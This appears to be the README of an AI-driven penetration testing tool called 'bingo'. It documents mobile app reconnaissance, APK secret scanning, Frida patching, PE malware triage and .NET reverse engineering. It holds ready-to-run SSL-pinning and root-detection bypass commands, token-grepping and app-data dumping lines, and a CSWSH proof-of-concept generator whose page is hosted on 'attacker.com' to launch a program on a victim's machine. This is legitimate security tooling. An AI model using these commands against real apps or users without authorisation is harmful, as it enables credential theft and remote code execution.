print(json.dumps(check_tools(), indent=2))
"
# Output:
# {
#   "trufflehog": { "available": true, "version": "trufflehog 3.82.6" },
#   "jadx":       { "available": true },
#   "java":       { "available": true },
#   "malimite_jar": { "available": false, "path": "not found — set MALIMITE_JAR env var" }
# }
```

### Install

```bash
# TruffleHog (Android APK scanning)
brew install trufflesecurity/trufflehog/trufflehog           # macOS
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin  # Linux

# Malimite (iOS decompiler) — requires Java 17+
brew install openjdk@17                                       # macOS
sudo apt install default-jdk-17                              # Ubuntu

# Download Malimite JAR
# https://github.com/LaurieWired/Malimite/releases/latest → Malimite.jar
mkdir -p ~/tools && mv ~/Downloads/Malimite.jar ~/tools/
# OR: export MALIMITE_JAR=~/Downloads/Malimite.jar

# Print full setup guide
python3 -c "from bingo.tools.apk_secret_scanner import install_guide; print(install_guide())"
```

---

## Mobile App Phase 0 — Android & iOS Reconnaissance (v2.2.8)

Cursor-grade mobile application penetration testing built directly into bingo.
No external tooling required for initial reconnaissance — everything runs through `bingo.tools.mobile_recon`.

### Architecture

```
mobile_recon.py
├── AndroidAnalyzer      — APK static analysis (aapt + apktool + jadx pipeline)
├── IOSAnalyzer          — IPA static analysis (unzip + plutil + otool + strings)
├── mobile_phase0()      — Unified auto-dispatch entry point
├── recon_by_package()   — Package name OSINT (no file required)
├── recon_by_store_url() — Play Store / App Store URL dispatcher
└── quick_setup_guide()  — Full environment setup instructions
```

### Skills (12 built-in — `bingo/skills/skills_data8.py`)

| Skill Name | Coverage |
|---|---|
| `mobile-phase0` | Unified Android/iOS Phase 0 auto-recon |
| `mobile-android-static` | APK static analysis (aapt → apktool → jadx → MobSF) |
| `mobile-android-dynamic` | Frida + objection + ADB dynamic analysis |
| `mobile-ios-static` | IPA static analysis (unzip → plutil → otool → strings) |
| `mobile-ios-dynamic` | iOS Frida + objection (jailbroken device) |
| `mobile-secret-scan` | 16-pattern hardcoded secret scanner |
| `mobile-ssl-bypass` | SSL pinning detection + bypass (Android + iOS) |
| `mobile-deep-link` | Intent / URL Scheme / App Link vulnerability analysis |
| `mobile-api-recon` | Network endpoint extraction (static + dynamic) |
| `mobile-frida-setup` | Frida environment setup + essential scripts |
| `mobile-store-osint` | APK/IPA acquisition from Play Store / App Store |
| `mobile-env-setup` | Complete mobile pentest toolchain setup guide |

### AI Auto-Selection

The AI automatically selects the appropriate mobile skill when it detects:

| Input Pattern | Selected Skill |
|---|---|
| `.apk` file path | `mobile-android-static` → `mobile-phase0` |
| `.ipa` file path | `mobile-ios-static` → `mobile-phase0` |
| `com.xxx.xxx` package name | `mobile-phase0` → `mobile-store-osint` |
| Play/App Store URL | `mobile-store-osint` |
| Keywords: `android`, `ios`, `frida`, `apk`, `ipa`, `mobile`, `adb` | `mobile-phase0` |
| Keywords: `ssl pinning`, `ssl bypass`, `certificate pin` | `mobile-ssl-bypass` |
| Keywords: `deep link`, `intent`, `exported`, `url scheme` | `mobile-deep-link` |
| Keywords: `hardcoded`, `secret scan`, `api key leak` | `mobile-secret-scan` |
| Keywords: `frida setup`, `objection install` | `mobile-frida-setup` |

### Usage Examples

```bash
# Auto-dispatch by file type
bingo "analyze target.apk"
bingo "pentest com.target.app"
bingo "recon https://play.google.com/store/apps/details?id=com.target"

# Python API
from bingo.tools.mobile_recon import mobile_phase0

# APK static analysis
result = mobile_phase0("target.apk")
print(result.summary())

# IPA static analysis  
result = mobile_phase0("target.ipa")
print(result.summary())

# Package OSINT (no file needed)
import json
info = mobile_phase0("com.target.app")
print(json.dumps(info, indent=2))

# Environment setup guide
from bingo.tools.mobile_recon import quick_setup_guide
print(quick_setup_guide("android"))  # or "ios" or "both"
```

### Phase 0 Output

```
[Mobile Phase 0 — ANDROID] target.apk
  App ID     : com.example.app
  Version    : 3.1.2
  Debuggable : ⚠️  YES
  Backup     : ⚠️  ALLOWED
  Clear Text : ⚠️  YES
  SSL Pinning: YES
  Root Detect: NOT DETECTED

  Permissions      : 23
  Exported Comps   : Activities=3 Services=1 Receivers=2 Providers=0
  Deep Links       : myapp://
  Network Endpoints: 47
  Hardcoded Secrets: 3
  3rd Party SDKs   : Firebase, Sentry, Amplitude Analytics

  [!] Hardcoded Secrets:
      [AWS_ACCESS_KEY] AKIA4XXXXXXXXXXXXXYZ @ assets/config.json:12
      [GOOGLE_API_KEY] AIzaSyXXXXXXXXXXXXX @ res/values/strings.xml:89
      [HARDCODED_PASSWORD] password='admin123' @ com/example/LoginActivity.smali:234

  [!] Vulnerabilities:
      [HIGH] Debuggable Build
      [HIGH] Cleartext Traffic Allowed
      [MEDIUM] Backup Allowed
      [MEDIUM] Dangerous Permissions (5)
```

### Secret Scanner — 16 Pattern Types

| Pattern | Example |
|---|---|
| AWS_ACCESS_KEY | `AKIA[0-9A-Z]{16}` |
| GOOGLE_API_KEY | `AIza[0-9A-Za-z-_]{35}` |
| FIREBASE_URL | `https://*.firebaseio.com` |
| STRIPE_KEY | `sk_live_[0-9a-zA-Z]{24}` |
| GITHUB_TOKEN | `ghp_[A-Za-z0-9]{36}` |
| JWT_TOKEN | `eyJ*.eyJ*.*` |
| KAKAO_KEY | Kakao API key pattern |
| NAVER_KEY | Naver API key pattern |
| PRIVATE_KEY | `-----BEGIN PRIVATE KEY-----` |
| HARDCODED_PASSWORD | `password = "..."` |
| + 6 more | ... |

### How to Use — Step by Step

bingo accepts APK/IPA in **three ways**. No upload server — everything runs locally.

---

#### Method 1: Local File Path (Most Common)

Download the APK/IPA to your machine first, then pass the file path to bingo.

```bash
# Step 1 — Download APK (any method)
#   - Manual download from https://apkpure.com or https://apkmirror.com
#   - Or use CLI tools (see below)

# Step 2 — Run bingo
bingo

# Step 3 — Type in the bingo chat prompt
> /path/to/target.apk analyze
> ~/Downloads/com.target.app.apk pentest
> /home/user/target.ipa vulnerability scan
```

bingo auto-detects `.apk` / `.ipa` extension and dispatches to the right analyzer.

---

#### Method 2: Package Name Only (No File Required — OSINT)

If you only know the package name, bingo can start reconnaissance immediately without a file.

```bash
# In the bingo chat prompt:
> com.kakaobank.channel analyze
> com.target.app mobile pentest
> com.samsung.android.health osint
```

**What bingo returns automatically:**
- Play Store / App Store direct URL
- APK download commands (gplaycli, APKPure, APKMirror)
- Domain recon commands (subfinder, amass, httpx)
- Certificate transparency lookup

---

#### Method 3: App Store URL (Paste and Go)

```bash
# Android — Google Play Store URL
> https://play.google.com/store/apps/details?id=com.target.app analyze

# iOS — Apple App Store URL
> https://apps.apple.com/kr/app/appname/id123456789 pentest
```

---

### Full Workflow Example

```
[Target: com.mybank.app]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STEP 1 — Start with package name (no APK yet)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

bingo> com.mybank.app mobile pentest

bingo auto-outputs:
  ✅ Play Store URL
  ✅ APK download commands (gplaycli / APKPure)
  ✅ Domain recon commands (subfinder / amass)
  ✅ Certificate transparency query

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STEP 2 — Download APK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Option A: gplaycli (CLI, Google account required)
python3 -m gplaycli -d com.mybank.app -f . -v
→ saves com.mybank.app.apk

# Option B: apkeep (no account needed)
apkeep -a com.mybank.app .
→ saves com.mybank.app.apk

# Option C: Manual browser download
# Visit https://apkpure.com/search?q=com.mybank.app
# Click "Download APK" → save to ~/Downloads/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STEP 3 — Static analysis (no device needed)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

bingo> com.mybank.app.apk static analysis

bingo auto-runs AndroidAnalyzer and outputs:
  ✅ AndroidManifest.xml findings (debuggable, backup, cleartext)
  ✅ Exported components (Activities, Services, Receivers, Providers)
  ✅ Deep links / URL schemes
  ✅ Hardcoded secrets scan (AWS key, API key, JWT, Firebase, etc.)
  ✅ 3rd-party SDK fingerprint (Firebase, Sentry, Amplitude...)
  ✅ Dangerous permissions list
  ✅ Ready-to-run ADB / Frida / objection commands

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STEP 4 — Dynamic analysis (rooted device required)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

bingo> com.mybank.app frida ssl pinning bypass

bingo outputs ready-to-copy commands:

  # Bypass SSL pinning
  objection -g com.mybank.app explore --startup-command 'android sslpinning disable'

  # Bypass root detection
  objection -g com.mybank.app explore --startup-command 'android root disable'

  # Dump SharedPreferences
  adb shell run-as com.mybank.app cat /data/data/com.mybank.app/shared_prefs/*.xml

  # Log all network traffic
  adb logcat | grep -iE 'token|Bearer|password|secret|api_key'
```

---

### APK Download Methods (All Options)

| Tool | Command | Notes |
|---|---|---|
| **gplaycli** | `python3 -m gplaycli -d <pkg> -f . -v` | Needs Google account |
| **apkeep** | `apkeep -a <pkg> .` | No account needed |
| **APKPure** (browser) | https://apkpure.com/search?q=`<pkg>` | Manual download |
| **APKMirror** (browser) | https://apkmirror.com | Manual download |
| **APKCombo** (browser) | https://apkcombo.com/search/`<pkg>` | Manual download |
| **ADB from device** | `adb pull $(adb shell pm path <pkg> \| cut -d: -f2) .` | Rooted device |

---

### IPA Download Methods (iOS — All Options)

| Tool | Command | Notes |
|---|---|---|
| **ipatool** | `ipatool download -b <bundle.id>` | Apple ID required |
| **frida-ios-dump** | `frida -U --codeshare luander/frida-ios-dump -f <bundle.id>` | Jailbroken device |
| **Clutch** | SSH to jailbroken device → `Clutch -d <bundle.id>` | Jailbroken only |
| **3uTools** (Windows) | GUI tool, extract IPA from connected device | iTunes needed |

---

### Python API (Direct Usage)

```python
from bingo.tools.mobile_recon import mobile_phase0, quick_setup_guide

# ── Android APK ───────────────────────────────────
result = mobile_phase0("/path/to/target.apk")
print(result.summary())

# Access specific data
print("Hardcoded secrets:", result.hardcoded_secrets)
print("Exported activities:", result.exported_activities)
print("Network endpoints:", result.network_endpoints[:10])
print("Vulnerabilities:", result.vulnerabilities)

# Copy-paste ready commands
print("\n=== ADB Commands ===")
for cmd in result.adb_commands:
    print(cmd)

print("\n=== Frida Commands ===")
for cmd in result.frida_commands:
    print(cmd)

print("\n=== objection Commands ===")
for cmd in result.objection_commands:
    print(cmd)

# ── iOS IPA ──────────────────────────────────────
result = mobile_phase0("/path/to/target.ipa")
print(result.summary())

# ── Package name OSINT (no file) ─────────────────
import json
info = mobile_phase0("com.target.app")
print(json.dumps(info, indent=2))

# ── App Store URL ─────────────────────────────────
info = mobile_phase0("https://play.google.com/store/apps/details?id=com.target")
print(json.dumps(info, indent=2))

# ── Environment setup guide ───────────────────────
print(quick_setup_guide("android"))   # Android only
print(quick_setup_guide("ios"))       # iOS only
print(quick_setup_guide("both"))      # Both platforms
```

---

### Install Required Tools

```bash
# macOS — Full stack
brew install apktool aapt android-platform-tools jadx
brew install libimobiledevice ideviceinstaller ifuse
pip install frida-tools objection gplaycli

# Ubuntu — Full stack
apt install apktool aapt adb default-jdk
pip install frida-tools objection
snap install jadx

# MobSF (all-in-one Docker)
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Print full setup guide
python3 -c "from bingo.tools.mobile_recon import quick_setup_guide; print(quick_setup_guide())"
```

---

## APK Toolkit — apkd + apkscan + apk.sh (v2.2.9)

v2.2.9 integrates three powerful Android reverse-engineering tools into bingo's AI engine.
The AI automatically selects the right tool based on what you ask.

### What's included

| Tool | Purpose | Source |
|------|---------|--------|
| **apkd** | Download APKs from multiple stores (ApkPure, F-Droid, ApkCombo, AppGallery, RuStore…) | [kiber-io/apkd](https://github.com/kiber-io/apkd) |
| **apkscan** | Secret + endpoint scanner for APKs (multi-decompiler, Gitleaks rules) | [LucasFaudman/apkscan](https://github.com/LucasFaudman/apkscan) |
| **apk.sh** | Frida Gadget injection, decode, rebuild, device pull — no root needed | [ax/apk.sh](https://github.com/ax/apk.sh) |

---

### 1. Download APK (apkd)

Download any APK by package name — no Google Play account required.

```bash
# Basic download (auto-selects best source)
bingo> download apk com.target.app

# Download from a specific store
bingo> apkd com.target.app from apkpure

# List all available versions
bingo> list apk versions com.target.app

# Batch download from a file
bingo> batch download apk packages.txt

# Find developer ID and download all their apps
bingo> developer apk download Instagram apkpure
```

**CLI equivalents (run outside bingo):**
```bash
apkd -p com.target.app -d -s apkpure          # download from ApkPure
apkd -p com.target.app -lv                    # list versions
apkd -p com.target.app -d -s fdroid           # download from F-Droid
apkd -l packages.txt -d                       # batch download
apkd -ld -p com.target.app -s apkpure         # find developer ID
apkd -d -did 'Instagram' -s apkpure           # all apps from developer
```

**Supported stores:**

| Store | Multiple Versions | Developer ID |
|-------|------------------|-------------|
| ApkPure | ✅ | ✅ |
| ApkCombo | ✅ | ✅ |
| F-Droid | ✅ | ❌ |
| AppGallery | ❌ | ❌ |
| RuStore | ❌ | ✅ |

**Installation:**
```bash
pip install git+https://github.com/kiber-io/apkd
```

---

### 2. Scan APK for Secrets & Endpoints (apkscan)

Scan APKs for hardcoded API keys, tokens, passwords, backend URLs, SSL pinning locations, and root detection code.

```bash
# AI-triggered automatically when you ask:
bingo> scan apk for secrets com.target.app.apk
bingo> find api keys in apk
bingo> android secret scan target.apk
bingo> find backend endpoints in apk

# Specify decompiler and rules
bingo> apkscan target.apk with jadx and gitleaks rules
```

**CLI equivalents:**
```bash
# Basic scan with default settings (JADX decompiler)
apkscan target.apk

# Use multiple decompilers for better coverage
apkscan target.apk -d jadx apktool cfr

# Use custom rule formats
apkscan target.apk -r rules/custom.toml      # Gitleaks TOML
apkscan target.apk -r rules/secrets.json     # SecretLocator JSON
apkscan target.apk -r rules/patterns.yaml    # secret-patterns-db YAML

# Output formats
apkscan target.apk -o results.json           # JSON output
apkscan target.apk --output-format sarif     # SARIF output
```

**What apkscan detects:**
- API keys (AWS, Google, Stripe, Twilio, etc.)
- OAuth tokens and secrets
- Database connection strings
- Backend API endpoints and URLs
- Cloud credentials (AWS, Azure, GCP)
- SSL pinning implementation locations
- Root detection code locations
- Hardcoded passwords and private keys

**Supported file formats:** `.apk`, `.xapk`, `.dex`, `.jar`, `.class`, `.smali`, `.zip`, `.aar`, `.arsc`, `.aab`, `.jadx.kts`

**Supported decompilers:** JADX, APKTool, CFR, Procyon, Krakatau, Fernflower

**Installation:**
```bash
pip install apkscan
# or from source:
pip install git+https://github.com/LucasFaudman/apkscan
```

---

### 3. Frida Gadget Injection & APK Manipulation (apk.sh)

Patch APKs to load Frida Gadget for dynamic instrumentation — **no root required**.

#### 3a. Pull APK from Device

```bash
# AI-triggered when you say:
bingo> pull apk from device com.target.app
bingo> extract apk from phone
bingo> adb pull apk com.target.app

# Also handles split APKs / app bundles automatically
```

**CLI equivalent:**
```bash
./apk.sh pull com.target.app
# Automatically merges split APKs into a single APK
```

#### 3b. Decode APK (Disassemble to Smali)

```bash
# AI-triggered when you say:
bingo> decode apk target.apk
bingo> disassemble apk to smali
bingo> apktool decode target.apk

# Decode without resources (faster)
bingo> decode apk target.apk no resources
```

**CLI equivalents:**
```bash
./apk.sh decode target.apk
./apk.sh decode target.apk -r           # skip resource decoding
./apk.sh decode target.apk -s           # skip dex disassembly
```

#### 3c. Patch APK with Frida Gadget

```bash
# AI-triggered when you say:
bingo> patch apk with frida target.apk
bingo> inject frida gadget arm64
bingo> frida no root target.apk
bingo> bypass ssl pinning with frida target.apk

# With custom gadget config
bingo> frida patch target.apk arm64 with script config
```

**CLI equivalents:**
```bash
# Basic patch (arm64)
./apk.sh patch target.apk --arch arm64

# With gadget config for script interaction
./apk.sh patch target.apk --arch arm64 --gadget-conf gadget.json

# With permissive network security config (for HTTPS interception)
./apk.sh patch target.apk --arch arm64 -n

# Install after patching
adb install target.gadget.apk
```

**Gadget config for SSL pinning bypass:**
```json
{
  "interaction": {
    "type": "script",
    "path": "/data/local/tmp/ssl_bypass.js",
    "on_change": "reload"
  }
}
```

```bash
# Push your Frida script and install
adb push ssl_bypass.js /data/local/tmp/
adb install target.gadget.apk
frida -U -n com.target.app  # or use objection
```

**Supported architectures:** `arm`, `arm64`, `x86`, `x86_64`

#### 3d. Rebuild APK

```bash
# AI-triggered when you say:
bingo> rebuild apk from smali
bingo> recompile apk target_dir
bingo> build apk after modification
```

**CLI equivalent:**
```bash
./apk.sh build target_dir/
```

#### 3e. Rename APK Package

```bash
bingo> rename apk package com.target.app to com.custom.app
```

**CLI equivalent:**
```bash
./apk.sh rename target.apk com.custom.newpackage
```

**Requirements for apk.sh:**
```bash
# macOS
brew install apktool aapt android-platform-tools

# Ubuntu/Debian
apt install apktool aapt adb

# Also needed:
# apksigner (comes with Android SDK Build Tools)
# unxz, zipalign
```

---

### 4. Full APK Analysis Pipeline

Run the complete workflow: download → scan for secrets → patch with Frida.

```bash
# AI-triggered when you say:
bingo> full apk analysis com.target.app
bingo> android pentest pipeline com.target.app
bingo> apk end to end analysis

# bingo will automatically:
# 1. Download APK from best available source
# 2. Scan for secrets, API keys, and backend endpoints
# 3. Patch with Frida Gadget for dynamic analysis
# 4. Generate Frida/Objection commands
```

**Python API:**
```python
from bingo.tools.apk_toolkit import full_apk_analysis_pipeline

result = full_apk_analysis_pipeline(
    package_name="com.target.app",
    output_dir="./analysis",
    arch="arm64",
    decompiler="jadx",
)
print(result["download"].summary())
print(result["scan"].summary())
print(result["patch"].summary())
```

---

### Skills Added (v2.2.9)

| Skill ID | Description | Trigger Keywords |
|----------|-------------|-----------------|
| `apk-download` | Download APK from multiple stores via apkd | download apk, apkpure, fdroid, apkcombo |
| `apkscan-secret-endpoint` | Scan APK for secrets and endpoints | apk secret, api key, android leaked, smali secret |
| `apk-frida-patch` | Inject Frida Gadget into APK (no root) | frida gadget, frida patch, ssl pinning bypass frida |
| `apk-decode-rebuild` | Decode/rebuild APK with apktool | apk decode, smali analysis, apk recompile |
| `apk-pull-device` | Pull APK from Android device via ADB | pull apk device, extract apk phone, adb pull apk |
| `apk-full-pipeline` | Complete APK download+scan+patch workflow | full apk analysis, android pentest pipeline |

---

### Install All APK Toolkit Tools

```bash
# apkd — APK downloader
pip install git+https://github.com/kiber-io/apkd

# apkscan — Secret & endpoint scanner
pip install apkscan

# apk.sh — Frida patcher
curl -O https://raw.githubusercontent.com/ax/apk.sh/main/apk.sh
chmod +x apk.sh

# System dependencies (macOS)
brew install apktool aapt android-platform-tools

# System dependencies (Ubuntu)
apt install apktool aapt adb default-jdk
```

---

## EXE Phase 0 — Windows PE / Executable Static Analysis (v2.3.5)

Analyze Windows executables (EXE / DLL / SYS / SCR / DRV) **without executing them**.  
bingo v2.3.5 integrates a full PE static analysis pipeline powered by `pefile` and `lief`.

### What is EXE Phase 0?

Phase 0 is the **initial recon stage** for Windows binaries — gather maximum intelligence before executing anything:

| Component | What it detects |
|-----------|----------------|
| PE Header | Architecture (x86/x64/ARM), compile timestamp, subsystem (GUI/CLI), entry point, image base |
| Section Analysis | Entropy per section — high entropy (>7.0) = packed/encrypted/obfuscated |
| Import Table | 30+ suspicious Windows APIs categorized by attack technique |
| String Extraction | C2 URLs, hardcoded IPs, API keys, registry paths, mutex names, Base64 blobs |
| Packer Detection | UPX, Themida, VMProtect, MPRESS, ASPack, Enigma, and custom packers |
| Digital Signature | Authenticode presence + validity check |
| YARA Scanning | Built-in rules + custom rule file support |
| Capability Scoring | Automated risk score (LOW / MEDIUM / HIGH) based on all indicators |
| Hash Computing | MD5, SHA1, SHA256, ImpHash, SSDeep (fuzzy hash) |
| VirusTotal Lookup | Optional hash lookup via VT API |

---

### Installation

```bash
# Core (required for PE analysis)
pip install pefile lief

# Optional (enhances analysis)
pip install yara-python ssdeep requests

# All-in-one
pip install pefile lief yara-python ssdeep requests
```

---

### Usage — bingo Natural Language Interface

Just type in bingo — AI selects the right skill automatically:

```
bingo> analyze exe malware.exe
bingo> pe analysis suspicious.dll
bingo> check imports target.exe
bingo> scan exe for secrets payload.exe
bingo> full exe analysis sample.exe
bingo> detect packer in packed.exe
bingo> yara scan malware.exe
bingo> compare pe original.exe modified.exe
```

---

### Usage — Python API

#### 1. Quick Full Analysis (one function)

```python
from bingo.tools.exe_analyzer import quick_scan

# Returns formatted summary string
print(quick_scan("malware.exe"))
```

Output example:
```
════════════════════════════════════════════════════════════════
  EXE Phase 0 — malware.exe
  Size     : 512.0 KB
  Arch     : x64
  Type     : EXE
  Subsystem: GUI (Windows)
  Compiled : 2024-03-15 12:30:00 UTC
────────────────────────────────────────────────────────────────
  MD5      : a1b2c3d4e5f6...
  SHA256   : 8f9a0b1c2d3e...
  ImpHash  : c7d8e9f0a1b2...
────────────────────────────────────────────────────────────────
  Signature: ❌ Unsigned
  Packer   : ⚠ UPX [high]
────────────────────────────────────────────────────────────────
  Risk     : 🔴 HIGH (12 indicators)
    • Process Injection: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
    • Anti-Debugging: IsDebuggerPresent, CheckRemoteDebuggerPresent
    • Credential Dumping: MiniDumpWriteDump
...
```

#### 2. Detailed Analysis (access all fields)

```python
from bingo.tools.exe_analyzer import analyze_pe

r = analyze_pe("target.exe", extract_strings=True, run_yara=True)

# File info
print(r.file_name, r.file_size_human)
print(r.hashes.md5, r.hashes.sha256)

# PE info
print(r.arch, r.subsystem, r.compile_time)
print(f"DLL: {r.is_dll}, .NET: {r.is_dotnet}")

# Sections with entropy
for sec in r.sections:
    if sec.entropy > 7.0:
        print(f"HIGH ENTROPY: {sec.name} = {sec.entropy:.2f}")

# Suspicious imports
for fn, reason in r.suspicious_imports:
    print(f"  [{reason}] {fn}")

# Extracted strings
print("URLs:", r.strings.urls[:5])
print("IPs:", r.strings.ips[:5])
print("API Keys:", r.strings.api_keys[:5])
print("Mutexes:", r.strings.mutexes)

# Packer
if r.packer.detected:
    print(f"Packer: {r.packer.packer_name} [{r.packer.confidence}]")

# Risk score
print(r.capabilities.severity())  # 🔴 HIGH / 🟡 MEDIUM / 🟢 LOW
for cap, ev in r.capabilities.capabilities:
    print(f"  {cap}: {ev}")

# YARA matches
print("YARA:", r.yara_matches)
```

#### 3. Batch Analysis — Scan Entire Directory

```python
from bingo.tools.exe_analyzer import batch_analyze

# Analyze all .exe, .dll, .sys in directory (recursive)
results = batch_analyze("./malware_samples/", recursive=True)

for r in results:
    if r.capabilities.total >= 5:  # Only show risky ones
        print(f"\n{r.file_name} [{r.capabilities.severity()}]")
        print(r.summary())
```

#### 4. Compare Two PE Files (detect tampering)

```python
from bingo.tools.exe_analyzer import compare_pe
import json

diff = compare_pe("original.exe", "modified.exe")
print(json.dumps(diff, indent=2))
```

Output:
```json
{
  "file1": "original.exe",
  "file2": "modified.exe",
  "hash_match": false,
  "imphash_match": false,
  "size_diff": 4096,
  "section_count_diff": 1,
  "r1_suspicious": 2,
  "r2_suspicious": 8,
  "r1_risk": "🟢 LOW",
  "r2_risk": "🔴 HIGH",
  "packer_change": true
}
```

#### 5. VirusTotal Hash Lookup

```python
import os
from bingo.tools.exe_analyzer import analyze_pe, vt_lookup

r = analyze_pe("target.exe")
result = vt_lookup(r.hashes.sha256, api_key=os.environ.get("VT_API_KEY", ""))
print(f"Detections: {result['malicious']}/{result['total']}")
print(f"Threat: {result['popular_threat']}")
print(f"Link: {result['link']}")
```

#### 6. YARA Scanning with Custom Rules

```python
from bingo.tools.exe_analyzer import analyze_pe

# With built-in rules (default)
r = analyze_pe("target.exe", run_yara=True)

# With custom rule file
r = analyze_pe("target.exe", run_yara=True, yara_rules="/path/to/custom.yar")
print("YARA matches:", r.yara_matches)
```

---

### CLI Equivalents

```bash
# PE analysis with pefile
python3 -c "from bingo.tools.exe_analyzer import quick_scan; print(quick_scan('target.exe'))"

# String extraction
strings target.exe | grep -E "https?://"
strings target.exe | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"

# Section entropy (requires pefile)
python3 -c "
from bingo.tools.exe_analyzer import analyze_pe
r = analyze_pe('target.exe')
for sec in r.sections:
    flag = '⚠ HIGH ENTROPY' if sec.entropy > 7.0 else ''
    print(f'{sec.name:<15} entropy={sec.entropy:.2f} {flag}')
"

# Import analysis
python3 -c "
from bingo.tools.exe_analyzer import analyze_pe
r = analyze_pe('target.exe')
for fn, reason in r.suspicious_imports:
    print(f'  [{reason}] {fn}')
"

# External: Detect-It-Easy (packer)
die target.exe
diec target.exe    # console mode

# External: YARA
yara rules.yar target.exe
yara -r rules/ ./samples/
```

---

### Suspicious API Reference

bingo auto-detects 30+ suspicious Windows APIs:

| API | Attack Technique |
|-----|-----------------|
| `VirtualAllocEx` | Process Injection |
| `WriteProcessMemory` | Process Injection |
| `CreateRemoteThread` | Process Injection |
| `NtUnmapViewOfSection` | Process Hollowing |
| `MiniDumpWriteDump` | Credential Dumping |
| `IsDebuggerPresent` | Anti-Debugging |
| `GetAsyncKeyState` | Keylogging |
| `SetWindowsHookEx` | Hook Installation |
| `RegSetValueEx` | Registry Persistence |
| `GetProcAddress` | Dynamic API Resolution |
| `BitBlt` | Screen Capture |
| `CryptUnprotectData` | DPAPI Decryption |

---

### Analysis Workflow

```
target.exe
    │
    ├─ Hash (MD5/SHA256/ImpHash/SSDeep)
    ├─ PE Header (arch, compile time, subsystem, .NET?)
    ├─ Section Entropy (>7.0 = packed/encrypted)
    ├─ Import Analysis (30+ suspicious APIs detected)
    ├─ Packer Detection (UPX/Themida/VMProtect/MPRESS...)
    ├─ String Extraction (URLs/IPs/keys/mutexes/registry)
    ├─ YARA Scanning (built-in + custom rules)
    ├─ Capability Scoring (LOW/MEDIUM/HIGH risk)
    └─ VirusTotal Lookup (optional, requires API key)
```

> **⚠ Safety**: NEVER execute malware samples on your host machine.  
> Use an isolated environment: **FlareVM** (Windows), **REMnux** (Linux), or **Cuckoo Sandbox** (automated).

---

### Skills Added (v2.3.5)

| Skill ID | Description | Trigger Keywords |
|----------|-------------|-----------------|
| `exe-pe-analysis` | Full PE header, section, metadata analysis | analyze exe, pe analysis, windows executable, exe phase 0 |
| `exe-string-extract` | Extract C2 URLs, IPs, secrets from binary | exe strings, url in exe, hardcoded ip, c2 address |
| `exe-import-analysis` | Detect 30+ suspicious Windows APIs | import analysis, suspicious api, process injection detection |
| `exe-packer-detect` | Detect UPX/Themida/VMProtect/MPRESS | packer detection, detect packer, entropy analysis |
| `exe-yara-scan` | YARA rule matching (built-in + custom) | yara scan, yara rules exe, malware signature |
| `exe-full-pipeline` | Complete EXE analysis + VT lookup + batch | full exe analysis, malware triage, virustotal lookup |

---

## .NET Reverse Engineering + CSWSH — AI-Assisted RCE Discovery (v2.3.5)

> **Reference:** [My First RCE by Reverse Engineering an EXE File With the Help of AI](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai) — Voorivex Team

### Background

A web pentest hit a dead-end on an encrypted JavaScript app.
The tester downloaded an EXE the app shouldn't have exposed,
used AI to walk through .NET reverse engineering step-by-step,
and chained **CSWSH (Cross-Site WebSocket Hijacking)** into **one-click RCE**.

**Key lesson:** Don't ask AI "go hack it" with one huge prompt.
Break the task into small, focused steps and feed results forward.

---

### What is this feature?

bingo v2.3.5 integrates this exact methodology:

| Step | Technique | bingo Module |
|------|-----------|-------------|
| 1 | .NET CLR / metadata detection | `dotnet_analyzer.detect_dotnet()` |
| 2 | US-heap string dump + categorization | `extract_dotnet_strings()` |
| 3 | Crypto key / IV detection (16-byte adjacent pairs) | `detect_crypto_material()` |
| 4 | Localhost WebSocket server discovery | `find_websocket_endpoints()` |
| 5 | CSWSH test (no Origin validation?) | `test_cswsh()` |
| 6 | PoC HTML generation (zero-click RCE) | `generate_cswsh_poc()` |

---

### Quick Start

#### Detect if an EXE is .NET

```bash
python -m bingo.tools.dotnet_analyzer target.exe
```

```
═══════════════════════════════════════════════════
  bingo v2.3.5 — .NET Analysis Report
  File: target.exe
═══════════════════════════════════════════════════
  .NET Assembly: ✅ YES
  CLR Version:   v4.0.30319
  Streams:       #~, #Strings, #US, #GUID, #Blob
  Embedded DLLs: WebSocketSharp, Newtonsoft.Json

  [CRYPTO] (2 items)
    ehdgoanfrhkq1234
    OfficeHDWebHard!

  🔑 CRYPTO MATERIAL CANDIDATES
  [0x0d54] 'ehdgoanfrhkq1234'  ← 16-byte → possible AES-128 key or IV
  [0x0d76] 'OfficeHDWebHard!'  ← adjacent pair at +34 bytes → key+IV pattern

  🔌 LOCALHOST WEBSOCKET ENDPOINTS (CSWSH Risk)
  ws://127.0.0.1:3100  (port 3100, source: exe-string)
    → Test CSWSH: bingo> cswsh test ws://127.0.0.1:3100
```

#### Test CSWSH vulnerability

```bash
python -m bingo.tools.dotnet_analyzer ws://127.0.0.1:3100
```

```
═══════════════════════════════════════════════════
  bingo v2.3.5 — CSWSH Test
  Target: ws://127.0.0.1:3100
═══════════════════════════════════════════════════
  Port Open:        ✅ YES
  Origin Validated: ❌ NO  ← VULNERABLE
  Severity:         CRITICAL

  ⚠ CSWSH CONFIRMED — Any website can connect to this WebSocket!
  PoC saved to: cswsh_poc.html
```

#### Generate CSWSH PoC HTML

```python
from bingo.tools.dotnet_analyzer import generate_cswsh_poc

html = generate_cswsh_poc("ws://127.0.0.1:3100", rce_payload="calc.exe")
open("poc.html", "w").write(html)
# → Host poc.html on attacker.com
# → Victim visits page → WebSocket auto-connects → calc.exe launches
```

#### Full pipeline (Python)

```python
from bingo.tools.dotnet_analyzer import analyze_dotnet, format_report, cswsh_full_test

# Step 1-4: Analyze EXE
result = analyze_dotnet("target.exe")
print(format_report(result))

# Step 5-6: Test each WebSocket endpoint found
for ep in result.websocket_endpoints:
    print(cswsh_full_test(ep.url, save_poc=f"poc_{ep.port}.html"))
```

#### bingo terminal

```
bingo> analyze target.exe dotnet
bingo> cswsh test ws://127.0.0.1:3100
